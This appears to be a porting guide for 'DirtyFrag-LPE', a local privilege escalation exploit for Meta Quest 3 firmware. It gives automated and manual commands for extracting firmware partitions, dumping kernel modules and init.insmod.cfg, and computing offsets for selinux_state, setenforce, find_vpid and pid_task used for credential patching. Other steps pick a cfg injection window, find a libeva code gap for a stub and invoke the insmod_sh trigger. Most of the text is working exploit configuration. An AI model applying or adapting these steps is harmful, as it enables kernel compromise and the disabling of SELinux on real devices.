# Porting DirtyFrag-LPE to a new Quest 3 firmware

A target is one `targets/<name>.json` + two gathered binaries in `targets/<name>/`
(the carrier `llcc_perfmon.ko` and the original `init.insmod.cfg`). Everything version-specific
lives in that JSON; no code changes.

You need the **exact-build firmware zip** `q3_<build>.zip` (for the carrier `.ko`, the cfg, and the
kernel → DELTA) and the **device connected** (to read its own libeva / libandroid_servers, which are
shell-readable, for exact offsets). Tools: `payload-dumper-go`, `debugfs`, `vmlinux-to-elf`,
`llvm-readelf`/`llvm-nm` (paths are set at the top of `port.py`).

---

## Automated (recommended)

```
python3 port.py --zip /path/q3_<build>.zip --name quest3-<short> --device <ADB_SERIAL>
```

This extracts boot/vendor/vendor_dlkm, pulls both carriers (`llcc_perfmon.ko` + `usbip-vudc.ko`) +
cfg, runs vmlinux-to-elf to compute the four **anchor-relative deltas** (`selinux_state`,
`find_vpid`, `pid_task`, `selinux_status_update_setenforce`, all minus `__platform_driver_register`),
pulls libeva/libandroid from the device to derive their offsets (and scans libeva for the code gap),
then writes `targets/quest3-<short>.json` + copies the binaries. It removes its 1.4 GB scratch on exit.

**Verify the draft** before use:
- `kernel.anchor_symbol` = `__platform_driver_register` (the CALL26 inside both carriers' init); the
  four `delta_*_from_anchor` are `<symbol> - __platform_driver_register` (32-bit two's complement).
- `cred_carrier` = a NOT-loaded module with a ≥~180 B `.init.text` and that anchor, whose deps are
  loaded. `usbip-vudc` (408 B init, dep `usbip-core` loaded) works on both Quest builds so far;
  `port.py` warns if it lacks the anchor.
- `cfg.inject_off`/`inject_len` must span whole cfg lines, be ≥ the insmod line, and end **>17 B
  before EOF** (sendfile can't send 17 B past EOF). `0x21`/`54` fits the standard 268-B cfg.
- `libeva.stub_gap_*` is a zero run in an executable segment (≥ ~1.7 KB).

Then run: `python3 orchestrate.py -t targets/quest3-<short>.json`.

---

## Manual (what `port.py` automates)

```bash
# 1. extract partitions from the exact-build zip
unzip -o q3_<build>.zip payload.bin
payload-dumper-go -p boot,vendor,vendor_dlkm -o out payload.bin

# 2. carriers + cfg  (must be byte-exact to the device -> from the exact build)
debugfs -R "dump /lib/modules/llcc_perfmon.ko targets/<name>/llcc_perfmon.ko" out/vendor_dlkm.img
debugfs -R "dump /lib/modules/usbip-vudc.ko   targets/<name>/usbip-vudc.ko"   out/vendor_dlkm.img
debugfs -R "dump /etc/init.insmod.cfg         targets/<name>/init.insmod.cfg" out/vendor.img
strings -a targets/<name>/llcc_perfmon.ko | grep vermagic        # must == device `cat /proc/version`

# 3. anchor-relative DELTAS from the kernel (all minus __platform_driver_register, KASLR-invariant)
vmlinux-to-elf out/boot.img vmlinux.elf
llvm-nm vmlinux.elf | grep -wE 'selinux_state|__platform_driver_register|find_vpid|pid_task|selinux_status_update_setenforce'
#   delta_selinux_from_anchor  = selinux_state                     - __platform_driver_register
#   delta_findvpid_from_anchor = find_vpid                         - __platform_driver_register
#   delta_pidtask_from_anchor  = pid_task                          - __platform_driver_register
#   delta_ssuse_from_anchor    = selinux_status_update_setenforce  - __platform_driver_register
#   (store each as 32-bit two's complement hex; negatives are fine, cred_patch.S sxtw's them)
llvm-readelf -r targets/<name>/llcc_perfmon.ko    # confirm '.rela.init.text' CALL26 = __platform_driver_register

# 4. libeva / libandroid offsets  (pull the device's own, shell-readable)
adb pull /vendor/lib64/libeva.so ; adb pull /system/lib64/libandroid_servers.so
llvm-readelf -S libeva.so | grep init_array          # -> init_array_off
#   orig_ctor_off = *(u64*)(libeva + init_array_off)   (first ctor)
#   stub_gap_off/size = a >=1.7KB zero run in an executable (r-x) PT_LOAD segment
llvm-readelf -sW libandroid_servers.so | grep NativeInputManager4dumpE   # -> dump_off/size
```

Fill `targets/<name>.json` (copy an existing one as a template). Confirm the device permits the
finit trigger: `adb shell setprop ctl.start insmod_sh` (should be allowed for `shell`).

> Note: across the builds seen so far the **userspace libs are identical** (only the kernel
> changes), so `libeva`/`libandroid`/`cfg`/carrier-layout values carried over unchanged between
> 5234532 and 5243367 — only `vermagic` and `delta_selinux_from_anchor` differed. Still verify.
